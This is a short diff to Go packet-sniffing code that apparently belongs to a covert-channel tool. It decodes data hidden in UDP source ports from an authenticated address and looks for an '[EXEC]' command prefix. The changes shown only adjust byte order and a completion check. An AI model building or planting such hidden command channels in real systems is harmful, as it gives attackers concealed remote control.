@@ -138,7 +138,6 @@ func beginListen(ip string, port, lport uint16) {
 	var udpLayer layers.UDP
 	var payload gopacket.Payload
 
-	i = 0
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer, &payload)
 	decoded := make([]gopacket.LayerType, 0, 4)
 	buffer := new(bytes.Buffer)
@@ -163,7 +162,7 @@ func beginListen(ip string, port, lport uint16) {
 		if pType == CLIENT {
 			if ipLayer.DstIP.String()  == localip.String() && uint16(udpLayer.DstPort) == lport {
 
-				err = binary.Write(buffer, binary.LittleEndian, uint16(udpLayer.SrcPort))
+				err = binary.Write(buffer, binary.BigEndian, uint16(udpLayer.SrcPort))
 				checkError(err)
 
 				if(port == SND_CMPLETE){
@@ -174,10 +173,10 @@ func beginListen(ip string, port, lport uint16) {
 		} else {
 			if incomingIP == authenticatedAddr {
 				
-				err = binary.Write(buffer, binary.LittleEndian, uint16(udpLayer.SrcPort))
+				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
 				
-				if(port == SND_CMPLETE){
+				if(uint16(udpLayer.DstPort) == SND_CMPLETE){
 
 					strData := buffer.String()
 					if strings.HasPrefix(strData, "[EXEC]") {
